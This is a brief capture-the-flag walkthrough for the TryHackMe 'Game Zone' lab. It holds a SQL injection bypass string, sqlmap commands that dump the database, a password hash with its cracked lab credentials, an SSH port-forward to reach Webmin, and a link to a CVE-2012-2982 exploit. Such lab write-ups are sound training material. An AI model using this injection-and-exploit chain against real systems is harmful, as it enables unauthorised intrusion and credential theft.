# Link

- https://tryhackme.com/room/gamezone

# Info

## IP = $IP

## Creds
- agent47:videogamer124

# Ports

## PortScanning
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## 80
### SQLi
```sql
' or 1=1 -- -
```

### Search input with `sqlmap`
- get request with burp
- save
- use sqlmap
```bash
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/GameZone]
└─$ sqlmap -r request.txt --dbms=mysql --dump
...
```
- get hash from temp file
```
┌──(kali㉿kali)-[/tmp/sqlmapkbt1n5c16087]
└─$ cat sqlmaphashes-h3zl911w.txt 
agent47:ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
```
- https://crackstation.net/


## 22

- login with creds


# PrivEsc

## Reverse SSH Tunnels
```
ssh -L 10000:localhost:10000 agent47@$IP
```

## 10000
- webmin cms
- login with creds
- version: 1.580

### find exploit
https://github.com/OstojaOfficial/CVE-2012-2982/blob/main/exploit.py